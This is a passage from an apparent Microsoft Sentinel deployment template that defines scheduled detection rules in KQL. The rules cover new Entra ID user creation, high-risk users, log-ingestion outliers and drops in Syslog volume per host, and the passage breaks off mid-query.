            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-1506: [RBA] Windows - Sensitive Group Enumeration - {{bv_src_user}}",
            "alertDescriptionFormat": "This alerts when a process enumerates the members of a security-enabled local group on the computer or device.\n\n{{ExtendedDescription}}\n\nMITRE: T1069\nCategory: Windows Security\ntag: RBA"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10505')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10505')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10505: [RBA] Azure AD - New User",
          "description": "Generates an event when there is a successful creation of a new user. MITRE: T1078 Category: Entra ID tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1h;\nlet latency = 1h;\nlet alert_bin = 1h;\nlet end_time = now();\nAuditLogs\n| where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where Category =~ 'UserManagement'\n| where OperationName =~ 'Add user'\n| where Result =~ 'success'\n| extend TargetType = tostring(TargetResources[0].type)\n| extend bv_dest_user = tostring(TargetResources[0].userPrincipalName)\n| where bv_dest_user matches regex BV10505_EXCLUDED_TRUST_PARTNER == false // Removing Trust External Partners\n| extend bv_src_user_type =  iff(isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)), 'User', 'Application') \n| extend bv_src_user = iff(isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)), tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), tostring(parse_json(tostring(InitiatedBy.app)).displayName)) \n| extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_src_user))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n| where TargetType =~ 'User'\n| extend bv_dest_user_type = iff(bv_dest_user contains \"#EXT#\", 'External - Guest User', 'Internal AAD User')\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend VictimEntity = pack_array(bv_dest_user)\n| extend ExtendedDescription = strcat(\n    'bv_src_user: ' , bv_src_user\n    ,'\\nbv_src_user_type: ' , bv_src_user_type \n    ,'\\nbv_dest_user: ' , bv_dest_user \n    ,'\\nbv_dest_user_type: ' , bv_dest_user_type \n)\n| project \n    bv_start_time = TimeGenerated\n    , bv_src_user\n    , bv_src_user_type\n    , bv_dest_user\n    , bv_dest_user_type\n    , bv_operation = OperationName\n    , ExtendedDescription\n    , AttackerEntity\n    , VictimEntity\n    , RBAScore = 1",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation",
            "DefenseEvasion",
            "Persistence",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Generates an event when there is a successful creation of a new user.\n\n\n{{ExtendedDescription}}\n\nMITRE: T1078\nCategory: Azure AD\ntag: RBA"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9042')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9042')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9042: [Health] - Log ingestion outlier",
          "description": "This alert identifies when a Microsoft Sentinel table ingestion volume for the last 24 hours is an outlier compared with the last 14 days. MITRE: T1070 Category: BV Connector,Health tag: Health",
          "severity": "Medium",
          "enabled": true,
          "query": "let latency = 0d;\nlet start_time = 1d;\nlet start_time_historical = 14d;\nlet end_time = now();\nlet alert_bin = 1d; \nlet OutlierThreshold = BV9042_CONFIG['OUTLIER_THRESHOLD']; // Default: 1.0\nlet PercentageThreshold = BV9042_CONFIG['PERCENTAGE_THRESHOLD']; // Default: 300.0\nlet GBPerDayThreshold = BV9042_CONFIG['GB_PER_DAY_THRESHOLD']; // Default: 2.0\nlet GetSecondTuesday = (t: (*), currentday:datetime) {\nt\n| extend firstDayOfMonth = datetime_add('day', -dayofmonth(currentday) + 1, currentday)\n| extend dayOfWeek = toint(dayofweek(firstDayOfMonth)/1d)\n    // Calculate days to add to reach first Tuesday (if day 1 is Tuesday, add 0; if day 1 is Wednesday, add 6; etc.)\n| extend daysToFirstTuesday = iff(dayOfWeek <= 2, 2 - dayOfWeek, 9 - dayOfWeek)\n    // Add 7 more days to get to second Tuesday\n| extend secondTuesday = datetime_add('day', daysToFirstTuesday + 7, firstDayOfMonth)\n| extend secondWednesday = datetime_add('day', 1, secondTuesday)\n};\nlet UsageEvents = materialize(Usage\n| where TimeGenerated > ago(start_time_historical)\n);\nUsageEvents\n| make-series currentDataVolume = sum(Quantity)/1000 on TimeGenerated from ago(start_time_historical) to end_time step alert_bin by DataType\n| extend series_stats(currentDataVolume), outlier=series_outliers(currentDataVolume,'ctukey')\n| mvexpand currentDataVolume to typeof(int), outlier to typeof(double), TimeGenerated to typeof(datetime)\n| project DataType, TimeGenerated, DataVolumeGBLast24h = currentDataVolume , outlier, AverageGBVolumePerDayLast14d = round(series_stats_currentDataVolume_avg,2)\n| extend IncreasePercentage = round(DataVolumeGBLast24h/AverageGBVolumePerDayLast14d*100,0)\n| where outlier >= OutlierThreshold\n| where TimeGenerated >= ago(start_time)\n| where IncreasePercentage >= PercentageThreshold\n| where DataVolumeGBLast24h >= GBPerDayThreshold\n|extend day_of_week = toint(dayofweek(now())/1d)\n|extend day_name = case(\n    day_of_week == '1', 'monday'\n    ,day_of_week == '2', 'tuesday'\n    ,day_of_week == '3', 'wednesday'\n    ,day_of_week == '4', 'thursday'\n    ,day_of_week == '5', 'friday'\n    ,day_of_week == '6', 'saturday'\n    ,day_of_week == '0', 'sunday'\n    ,'')\n| mv-apply th=BV9042_CONFIG.EXCLUSIONS on ( \n    extend table_name = iff(isnotempty(th.TABLE_NAME), tostring(th.TABLE_NAME), '')\n    | mv-apply dn=th.details on ( \n    extend day_name_conf = iff(isnotempty(dn['day_name']), tostring(dn['day_name']), ''))\n    | extend patch_tue_conf = dn['patch']\n| summarize day_name_conf_reg = make_set_if(day_name_conf, patch_tue_conf !has 'true'), table_name_reg = make_set_if(table_name, patch_tue_conf !has 'true'), patch_tue_conf = make_set(patch_tue_conf), day_name_conf_patch = make_set_if(day_name_conf, patch_tue_conf has 'true'), table_name_patch = make_set_if(table_name, patch_tue_conf has 'true')\n)\n| extend match = table_name_reg has DataType and day_name_conf_reg has day_name\n| where match == false\n| invoke GetSecondTuesday(now())\n| where (table_name_patch has DataType and toint(format_timespan(now() - secondWednesday, 'd')) <= 0 and patch_tue_conf has 'true' and day_name_conf_patch has day_name) == false\n| join kind=innerunique (\nUsageEvents\n| where TimeGenerated > ago(start_time_historical)\n| summarize First = min(TimeGenerated) by DataType) on DataType\n| where now() - First > 10d\n| extend Outlier = round(outlier,2)\n| sort by TimeGenerated desc, IncreasePercentage desc\n| extend bv_start_time = TimeGenerated\n        , bv_datatype = DataType\n        , bv_mss_category = 'Ingestion outlier'\n        , bv_alarm_type = 'Usage'\n        , bv_alarm_subtype = 'Usage - increase'\n        , bv_alarm_name = 'BV-9042'\n        , bv_alarm_threshold = tostring(BV9042_CONFIG['PERCENTAGE_THRESHOLD'])\n        , bv_alarm_value = IncreasePercentage\n        , bv_severity = 'medium'\n        , sourcetype = DataType\n| project-away First, outlier, DataType1\n| extend ExtendedDescription = strcat('This alert identifies when a Microsoft Sentinel table ingestion volume for the last 24 hours is an outlier compared with the last 14 days. ','Table ',DataType,' has been identified as experiencing a ', IncreasePercentage, '% increase in comparison with the previous 14 days. The last 24 hours ingestion volume was ', DataVolumeGBLast24h, ' GB vs. ', AverageGBVolumePerDayLast14d,' daily average for the last 14 days.')\n| extend Tags = 'tag: Health'\n| extend bv_rule_version = '1.3.4309'\n| extend bv_rule_timestamp = '1697832166.4017675'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.3.4309 bv_rule_timestamp: 1697832166.4017675'      \n| project-reorder TimeGenerated, DataType, DataVolumeGBLast24h, AverageGBVolumePerDayLast14d, IncreasePercentage, Outlier, ExtendedDescription, Tags\n| join kind=leftanti (SecurityAlert\n| where TimeGenerated > ago(7d)\n| summarize count(), Last=max(TimeGenerated) by AlertName\n| where AlertName startswith \"BV-9042\"\n| extend DataType = tostring(split(AlertName,' ')[-1])) on DataType      \n| project-keep bv_*, DataType, DataVolumeGBLast24h, AverageGBVolumePerDayLast14d, IncreasePercentage, Outlier, ExtendedDescription, Tags, ExtendedDescription, sourcetype",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1070"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9042: [Health] - Log ingestion outlier for table {{DataType}}",
            "alertDescriptionFormat": "{{ExtendedDescription}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9061')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9061')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9061: [Health] Syslog - Ingestion - Decrease In Log Volumes (Low-volume Hosts)",
          "description": "This alert identifies a significant decrease in log volume for a specific host in the Syslog table. It compares the recent ingestion volume against the daily average calculated over the past 14 days, highlighting instances where a notable drop in logging activity occurs that may indicate data collection issues or system health problems.\nTo be considered, log volumes are expected ranging from 1 to 99,999 per day. MITRE:  Category: Health tag: Health",
          "severity": "Medium",
          "enabled": true,
          "query": "let latency = 0h;  \nlet start_time = 1h;\nlet end_time = now(); \nlet DeviationSlider = 2;\nlet DeviationThreshold = 100;\nlet suppression_time = 2d;\nlet start_time_historical = 14d;   \nlet RecentAlerts = toscalar(SecurityAlert\n  |where TimeGenerated between (ago(suppression_time) .. now())\n  | where AlertName startswith 'BV-9061:'\n  |parse AlertName with * ' Decrease In ' * 'From ' host_name\n  |summarize make_set_if(host_name, isnotempty(host_name)), eventcount=count()\n  );      \nlet Previous9053Alerts = toscalar(SecurityAlert\n  |where TimeGenerated >= ago(start_time_historical)\n  | where AlertName has 'BV-9053:'\n  | parse AlertName with * 'offline' * '[' host ']'\n  | extend host = split(replace_string(host, '\"', ''), ',')\n  | summarize make_set_if(host, host[0] <> ''));         \nlet Baseline = Syslog\n| where TimeGenerated between (startofday(ago(start_time_historical)) .. endofday(ago(1d)))\n| project Computer, TimeGenerated, HostName\n| extend Computer = iif(isnotempty(Computer), HostName, Computer)\n| where isnotempty(Computer)\n| where tolower(Computer) matches regex tolower(BV9061_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts) and Computer !in~ (Previous9053Alerts)\n| project Computer, TimeGenerated\n| summarize EventCount = count() by Computer, bin(TimeGenerated, 1d)\n| summarize percentile_EventCount_25=percentiles(EventCount, 25),percentile_EventCount_75=percentiles(EventCount, 75),percentile_EventCount50=percentiles(EventCount, 50),MaxCount=max(EventCount),AvgCount=avg(EventCount),MinCount=min(EventCount), NumberofDays = countif(isnotempty(TimeGenerated)) by Computer\n| extend CandleBody = percentile_EventCount_75 - percentile_EventCount_25\n      | extend MyDeviation = CandleBody * DeviationSlider\n      | where MyDeviation  > DeviationThreshold and NumberofDays >= 3\n      | where AvgCount between (1 .. 99999)\n;\nSyslog\n| where TimeGenerated between (startofday(ago(1d)) .. startofday(now()))\n| project Computer, TimeGenerated, HostName\n| extend Computer = iif(isnotempty(Computer), HostName, Computer)\n| where isnotempty(Computer)\n| where tolower(Computer) matches regex tolower(BV9061_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts) and Computer !in~ (Previous9053Alerts)\n| project Computer, TimeGenerated\n| summarize TodayEventCount = count() by Computer\n| join kind=inner (Baseline) on Computer\n      | extend AlertThreshold = iff(MinCount < MyDeviation, MyDeviation-MinCount, MinCount-(MyDeviation))\n      , PercentBelowMin = round(100- ((TodayEventCount * 1.0)/(MinCount * 1.0) * 100), 2)\n                        |extend day_of_week = toint(dayofweek(now())/1d)\n                |extend day_name = case(\n                    day_of_week == '1', 'monday'\n                    ,day_of_week == '2', 'tuesday'\n                    ,day_of_week == '3', 'wednesday'\n                    ,day_of_week == '4', 'thursday'\n                    ,day_of_week == '5', 'friday'\n                    ,day_of_week == '6', 'saturday'\n                    ,day_of_week == '0', 'sunday'\n                    ,'')\n      | extend week_day = iff(day_name has_any ('saturday', 'sunday'), false, true)\n| extend threshold = case(\n    day_name has_any ('saturday', 'sunday'), 95, // Default weekend threshold\n    week_day == true, 60,                       // Default weekday threshold\n    50)\n// Apply configured thresholds if present\n| extend threshold = case(\n    day_name in (BV9061_CONFIG['THRESHOLD'][0]['day_name']), BV9061_CONFIG['THRESHOLD'][0]['value'],\n    week_day == BV9061_CONFIG['THRESHOLD'][1]['week_day'], BV9061_CONFIG['THRESHOLD'][1]['value'],\n    threshold)\n, PercentBelowMin = iff(PercentBelowMin < 0, -PercentBelowMin, PercentBelowMin)\n, PercentBelowAvg = round(100- ((TodayEventCount * 1.0)/(AvgCount * 1.0) * 100), 2)\n| where TodayEventCount < AlertThreshold or PercentBelowMin > threshold\n| where PercentBelowAvg > threshold\n| extend Tags = 'tag: Health' \n        , bv_start_time = now()\n        , bv_datatype = 'Syslog'\n        , bv_mss_category = 'Ingestion outlier'\n        , bv_alarm_type = 'Usage'\n        , bv_alarm_subtype = 'Usage - Decrease'\n        , bv_alarm_name = 'BV-9061'\n        , bv_alarm_threshold = threshold\n        , bv_alarm_value = PercentBelowMin\n        , bv_severity = 'medium'\n        , sourcetype = 'Syslog'          \n        , bv_src_dvc = Computer\n        , bv_event_count = TodayEventCount\n        , bv_min_count = MinCount\n        , bv_avg_count = round(AvgCount,0)\n        , bv_event_threshold = AlertThreshold\n        , bv_percent_below_avg = PercentBelowAvg              \n| extend ExtendedDescription = iff(TodayEventCount < AlertThreshold, strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, today's log count is \", bv_event_count, \", representing a \", bv_percent_below_avg, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\"),\n              strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, today's log count is \", bv_event_count, \" with a previous minimum count of \", bv_min_count, \" representing a \", bv_alarm_value, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\"))\n|project-keep  ExtendedDescription, Tags, sourcetype\n  , bv_* ",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": "2025-09-13T00:00:00.000Z",
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9061: [Health] Syslog - Ingestion - Decrease In Log Volumes From {{bv_src_dvc}}",
            "alertDescriptionFormat": "This alert identifies a significant decrease in log volume for a specific host in the Syslog table. It compares the recent ingestion volume against the daily average calculated over the past 14 days, highlighting instances where a notable drop in logging activity occurs that may indicate data collection issues or system health problems.\nTo be considered, log volumes are expected ranging from 1 to 99,999 per day.\n{{ExtendedDescription}} \nCategory: Ingestion outlier\n{{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9064')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9064')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9064: [Health] Syslog - Ingestion - Decrease In Log Volumes (High-volume Hosts)",
          "description": "This alert identifies a significant decrease in log volume for a specific host in the Syslog table. It compares the recent ingestion volume against the daily average calculated over the past 14 days, highlighting instances where a notable drop in logging activity occurs that may indicate data collection issues or system health problems.\nTo be considered, log volumes are expected to be greater than 100,000 per day. MITRE:  Category: Health tag: Health",
          "severity": "Medium",
          "enabled": true,
          "query": "let latency = 0h;  \nlet start_time = 1h;\nlet end_time = now(); \nlet DeviationSlider = 2;\nlet DeviationThreshold = 100;\nlet suppression_time = 2d;\nlet start_time_historical = 14d;   \nlet RecentAlerts = toscalar(SecurityAlert\n  |where TimeGenerated between (ago(suppression_time) .. now())\n  | where AlertName startswith 'BV-9064:'\n  |parse AlertName with * ' Decrease In ' * 'From ' host_name\n  |summarize make_set_if(host_name, isnotempty(host_name)), eventcount=count()\n  );      \nlet Previous9053Alerts = toscalar(SecurityAlert\n  | where TimeGenerated >= ago(start_time_historical)\n  | where AlertName has 'BV-9053:'\n  | parse AlertName with * 'offline' * '[' host ']'\n  | extend host = split(replace_string(host, '\"', ''), ',')\n  | summarize make_set_if(host, host[0] <> ''));         \nlet Baseline = Syslog\n|where TimeGenerated between (startofday(ago(start_time_historical)) .. endofday(ago(1d)))\n| project Computer, TimeGenerated, HostName\n| extend Computer = iif(isnotempty(Computer), HostName, Computer)\n| where isnotempty(Computer)\n| where tolower(Computer) matches regex tolower(BV9064_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts) and Computer !in~ (Previous9053Alerts)\n| project Computer, TimeGenerated\n| summarize EventCount = count() by Computer, bin(TimeGenerated, 1d)\n| summarize percentile_EventCount_25=percentiles(EventCount, 25),percentile_EventCount_75=percentiles(EventCount, 75),percentile_EventCount50=percentiles(EventCount, 50),MaxCount=max(EventCount),AvgCount=avg(EventCount),MinCount=min(EventCount), NumberofDays = countif(isnotempty(TimeGenerated)) by Computer\n| extend CandleBody = percentile_EventCount_75 - percentile_EventCount_25\n      | extend MyDeviation = CandleBody * DeviationSlider\n      | where MyDeviation  > DeviationThreshold and NumberofDays >= 3\n      | where AvgCount >= 100000\n;\nSyslog\n| where TimeGenerated between (startofday(ago(1d)) .. startofday(now()))\n| project Computer, TimeGenerated, HostName\n| extend Computer = iif(isnotempty(Computer), HostName, Computer)\n| where isnotempty(Computer)\n| where tolower(Computer) matches regex tolower(BV9064_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts) and Computer !in~ (Previous9053Alerts)\n| project Computer, TimeGenerated\n| summarize TodayEventCount = count() by Computer\n| join kind=inner (Baseline) on Computer\n      | extend AlertThreshold = iff(MinCount < MyDeviation, MyDeviation-MinCount, MinCount-(MyDeviation))\n      , PercentBelowMin = round(100- ((TodayEventCount * 1.0)/(MinCount * 1.0) * 100), 2)\n                        |extend day_of_week = toint(dayofweek(now())/1d)\n                |extend day_name = case(\n                    day_of_week == '1', 'monday'\n                    ,day_of_week == '2', 'tuesday'\n                    ,day_of_week == '3', 'wednesday'\n                    ,day_of_week == '4', 'thursday'\n                    ,day_of_week == '5', 'friday'\n                    ,day_of_week == '6', 'saturday'\n                    ,day_of_week == '0', 'sunday'\n                    ,'')\n      | extend week_day = iff(day_name has_any ('saturday', 'sunday'), false, true)\n| extend threshold = case(\n    day_name has_any ('saturday', 'sunday'), 95, // Default weekend threshold\n    week_day == true, 60,                       // Default weekday threshold\n    50)\n// Apply configured thresholds if present\n| extend threshold = case(\n    day_name in (BV9064_CONFIG['THRESHOLD'][0]['day_name']), BV9064_CONFIG['THRESHOLD'][0]['value'],\n    week_day == BV9064_CONFIG['THRESHOLD'][1]['week_day'], BV9064_CONFIG['THRESHOLD'][1]['value'],\n    threshold)\n, PercentBelowMin = iff(PercentBelowMin < 0, -PercentBelowMin, PercentBelowMin)\n, PercentBelowAvg = round(100- ((TodayEventCount * 1.0)/(AvgCount * 1.0) * 100), 2)\n| where TodayEventCount < AlertThreshold or PercentBelowMin > threshold\n| where PercentBelowAvg > threshold\n| extend Tags = 'tag: Health' \n        , bv_start_time = now()\n        , bv_datatype = 'Syslog'\n        , bv_mss_category = 'Ingestion outlier'\n        , bv_alarm_type = 'Usage'\n        , bv_alarm_subtype = 'Usage - Decrease'\n        , bv_alarm_name = 'BV-9064'\n        , bv_alarm_threshold = threshold\n        , bv_alarm_value = PercentBelowMin\n        , bv_severity = 'medium'\n        , sourcetype = 'Syslog'          \n        , bv_src_dvc = Computer\n        , bv_event_count = TodayEventCount\n        , bv_min_count = MinCount\n        , bv_avg_count = round(AvgCount,0)\n        , bv_event_threshold = AlertThreshold\n        , bv_percent_below_avg = PercentBelowAvg              \n| extend ExtendedDescription = iff(TodayEventCount < AlertThreshold, strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, today's log count is \", bv_event_count, \", representing a \", bv_percent_below_avg, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\"),\n              strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, today's log count is \", bv_event_count, \" with a previous minimum count of \", bv_min_count, \" representing a \", bv_alarm_value, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\"))\n|project-keep  ExtendedDescription, Tags, sourcetype\n  , bv_* ",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": "2025-09-13T00:00:00.000Z",
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9064: [Health] Syslog - Ingestion - Decrease In Log Volumes From {{bv_src_dvc}}",
            "alertDescriptionFormat": "This alert identifies a significant decrease in log volume for a specific host in the Syslog table. It compares the recent ingestion volume against the daily average calculated over the past 14 days, highlighting instances where a notable drop in logging activity occurs that may indicate data collection issues or system health problems.\nTo be considered, log volumes are expected to be greater than 100,000 per day.\n{{ExtendedDescription}} \nCategory: Ingestion outlier\n{{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-625')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-625')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-625: [RBA] Azure AD - High Risk User",
          "description": "High Risk Users as identified by Azure AD P2 license. MITRE: T1078 Category: Entra ID tag: RBA",
          "severity": "High",
          "enabled": true,
          "query": "let latency = 15m;\nlet start_time = 15m;\nlet end_time = now();\nlet alert_bin = 15m;\nlet SignInRiskData = SigninLogs\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where RiskLevelAggregated !~ 'none'\n| where ResultType != 0\n| where IPAddress !in~(A625_EXCLUDED_IPADDRESS)\n| summarize \n    EventStartTime = min(TimeGenerated),\n    EventEndTime = max(TimeGenerated),\n    EventCount = count(),\n    RiskEventTypes = make_set(todynamic(RiskEventTypes_V2)), \n    RiskLevels = make_set(RiskLevelAggregated),\n    SrcIpAddr = make_set(IPAddress,5),\n    UniqueSrcIpAddr = dcount(IPAddress),\n    Apps = make_set(AppDisplayName,5),\n    UserAgentString = make_set(UserAgent,5)\nby SrcUsername=UserPrincipalName, bin_at(TimeGenerated, alert_bin, now());\nlet AADRiskData = AADUserRiskEvents  \n| where TimeGenerated between (ago(latency + start_time) .. end_time)\n| summarize\n    AADRisk_RiskLevels = make_set(RiskLevel),\n    AADRisk_RiskTypes = make_set(RiskEventType)\nby UserPrincipalName;\nSignInRiskData\n| join kind=leftouter AADRiskData on $left.SrcUsername == $right.UserPrincipalName\n| extend ConsolidatedRiskLevels = array_concat(coalesce(RiskLevels, dynamic([])), coalesce(AADRisk_RiskLevels, dynamic([])))\n| extend ConsolidatedRiskTypes = array_concat(coalesce(RiskEventTypes, dynamic([])), coalesce(AADRisk_RiskTypes, dynamic([])))\n| extend RBAScore = 0\n| extend RBAScore = case\n    (ConsolidatedRiskLevels contains 'high', RBAScore+3,\n     ConsolidatedRiskLevels contains 'medium', RBAScore+2,\n     ConsolidatedRiskLevels contains 'low', RBAScore+1,\n     0)\n| extend TrueRiskLevel = case(\n    ConsolidatedRiskLevels contains 'high', \"high\",\n    ConsolidatedRiskLevels contains 'medium', \"medium\", \n    \"low\"\n)\n| parse SrcUsername with UserName '@' UserDomain\n| extend VictimEntity = pack_array(UserName)\n| extend AttackerEntity = SrcIpAddr\n| extend ExtendedDescription = strcat(\n    '  SrcUsername: ', SrcUsername,\n    ' \\nTrue Risk Level: ', TrueRiskLevel, ' (RBA Score: ', RBAScore, ')',\n    ' \\nSigninLogs RiskLevels: \\n* ', strcat_array(array_slice(coalesce(RiskLevels, dynamic([\"None\"])),0,5), '\\n* '),\n    ' \\nAADRisk RiskLevels: \\n* ', strcat_array(array_slice(coalesce(AADRisk_RiskLevels, dynamic([\"None\"])),0,5), '\\n* '),\n    ' \\n\\nConsolidated RiskTypes: \\n* ', strcat_array(array_slice(ConsolidatedRiskTypes,0,5), '\\n* '),\n    ' \\n\\nNumber of Events: ', EventCount,\n    ' \\nNumber of SrcIpAddr: ', UniqueSrcIpAddr,\n    ' \\nSrcIpAddr: \\n* ', strcat_array(array_slice(SrcIpAddr,0,5), '\\n* '),\n    ' \\n\\nApps: \\n* ', strcat_array(array_slice(Apps,0,5), '\\n* '),\n    ' \\n\\nUserAgentString: \\n* ', strcat_array(array_slice(UserAgentString,0,5), '\\n* ')\n)\n| extend IPAddress1 = SrcIpAddr[0]\n| extend bv_rule_version = '1.0.5163'\n| extend bv_rule_timestamp = '1712778702.5301013'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5163 bv_rule_timestamp: 1712778702.5301013'\n| project\n    EventStartTime,\n    EventEndTime,\n    SrcUsername,\n    SrcIpAddr,\n    UserAgentString,\n    AttackerEntity,\n    VictimEntity,\n    Apps,\n    TrueRiskLevel,\n    ConsolidatedRiskLevels,\n    ConsolidatedRiskTypes,\n    ExtendedDescription,\n    UserName,\n    UserDomain,\n    RBAScore,\n    IPAddress1,\n    